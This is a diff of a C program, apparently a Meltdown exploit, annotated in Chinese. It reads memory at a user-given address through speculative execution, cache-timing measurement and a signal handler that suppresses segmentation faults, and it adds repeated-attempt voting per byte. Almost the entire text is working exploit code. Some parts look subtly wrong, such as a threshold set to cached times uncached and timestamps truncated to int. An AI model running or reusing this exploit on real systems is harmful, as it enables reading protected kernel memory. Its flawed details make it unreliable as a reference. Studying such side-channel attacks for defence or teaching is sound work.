@@ -6,14 +6,17 @@
 #include <x86intrin.h>
 #define PAGE_SIZE 4 * 1024
 #define ARRAY_SIZE 256
+#define ATTEMP 5
+#define MOREINFO 0
 
 static char target_array[ARRAY_SIZE * PAGE_SIZE];
 static int check_array[ARRAY_SIZE];
 int cache_threshold;
 
-static inline int get_access_time(volatile char *addr)
+/*获取访问目标地址的时间*/
+static int get_access_time(volatile char *addr)
 {
-unsigned long long time1, time2;
+int time1, time2;
 int zero=0;
 time1 = __rdtscp(&zero);
 (void)*addr;
@@ -30,16 +33,17 @@ void clflush()
 
 extern char stopspeculate[];
 
-static void __attribute__((noinline)) speculate(unsigned long addr){
+static void speculate(unsigned long addr){
 	asm volatile (
+		/*塞一些空操作保证后面断攻击代码可以乱序执行*/
 		".rept 500\n\t"
-		"add $0x456, %%rax\n\t"
+		"nop\n\t"
 		".endr\n\t"
-
+		/*参考论文中的三行核心攻击代码*/
 		"movzx (%[addr]), %%eax\n\t"
 		"shl $12, %%rax\n\t"
 		"movzx (%[target], %%rax, 1), %%rbx\n"
-
+		/*抑制段错误手段，发生段错误后使此函数直接返回，详细见后*/
 		"stopspeculate: \n\t"
 		"nop\n\t"
 		:
@@ -48,6 +52,7 @@ static void __attribute__((noinline)) speculate(unsigned long addr){
 		: "rax", "rbx"
 	);
 }
+/*检查target数组中那些项进入了缓存*/
 void check(){
 	int i, time;
 	volatile char *addr;
@@ -59,7 +64,7 @@ void check(){
 	}
 }
 
-int readbyte(int fd, unsigned long addr, int count)
+int attackonebyte(int fd, unsigned long addr)
 {
 	int i,max = -1, max_i = 0;
 	static char buf[256];
@@ -74,25 +79,25 @@ int readbyte(int fd, unsigned long addr, int count)
 		speculate(addr);
 		check();
 	}
-
-	for (i = 1; i < ARRAY_SIZE; i++) {
-		if (check_array[i] && check_array[i] > max) {
+	max_i=-1;
+	for (i = 0; i < ARRAY_SIZE; i++) {
+		if (check_array[i] > max) {
 			max = check_array[i];
 			max_i = i;
 		}
 	}
-	if(max_i==-1)
-	return 0;
 	return max_i;
 }
-
+/*以下是抑制段错误的函数，参照https://github.com/paboldin/meltdown-exploit.git*/
+/*大致策略是修改sigaction使发生段错误时的操作变为一条nop指令*/
+/*此函数将输入信号断对应服务程序入口改到stopspeculate处，此处为一条空指令并马上返回*/
 void sigsegv(int sig, siginfo_t *siginfo, void *context)
 {
 	ucontext_t *ucontext = context;
 	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
 	return;
 }
-
+/*此函数设置段错误信号SIGSEGV的SA_SIGINFO标志位，表示激活替代的信号处理程序，这里是nop*/
 int set_signal(void)
 {
 	struct sigaction act = {
@@ -102,6 +107,7 @@ int set_signal(void)
 
 	return sigaction(SIGSEGV, &act, NULL);
 }
+/*设置缓存时间阀值*/
 void set_cached_threshold(void)
 {
 	long cached,uncached;
@@ -112,19 +118,18 @@ void set_cached_threshold(void)
 	}
 	for (cached = 0, i = 0; i < 10000; i++)
 		cached += get_access_time(target_array);
-	for (cached = 0, i = 0; i < 10000; i++)
-		cached += get_access_time(target_array);
 	cached /= 10000;
 	uncached /= 10000;
 	cache_threshold=cached*uncached;
 }
 int main(int argc, char *argv[])
 {
-	int i, ret;
+	int i, ret,j,max,max_i,k;
 	int fd;
 	unsigned long addr;
 	int size=10;
-	static char record[200];
+	static char record[50];
+	static int attemp[ARRAY_SIZE];
 	sscanf(argv[1], "%lx", &addr);
 	sscanf(argv[2], "%dx", &size);
 	ret=set_signal();
@@ -133,8 +138,30 @@ int main(int argc, char *argv[])
 	fd = open("/proc/version", O_RDONLY);
 	for (i = 0; i < size; i++)
 	{
-		ret = readbyte(fd, addr,0);
-		printf("read:%lx data=%2x %c\n", addr, ret,isprint(ret)?ret:' ');
+		memset(attemp, 0, sizeof(attemp));
+		max=-1; max_i=0;
+		for(j=0;j<ATTEMP;j++)
+		{
+		ret = attackonebyte(fd, addr);
+#if MOREINFO
+		printf("%c ",isprint(ret)?ret:' ');
+#endif
+		attemp[ret]++;
+		for (k = 0; k < ARRAY_SIZE; k++) 
+		{
+		if (attemp[k] > max&&isprint(k)) 
+		{
+			max = attemp[k];
+			max_i = k;
+		}
+		}
+		}
+		ret=max_i;
+		printf("read:%lx data=%2x %c", addr, ret,isprint(ret)?ret:' ');
+		#if MOREINFO
+		printf("  %din%d",max,ATTEMP);
+		#endif
+		printf("\n");
 		record[i]=isprint(ret)?ret:' ';
 		addr++;
 	}
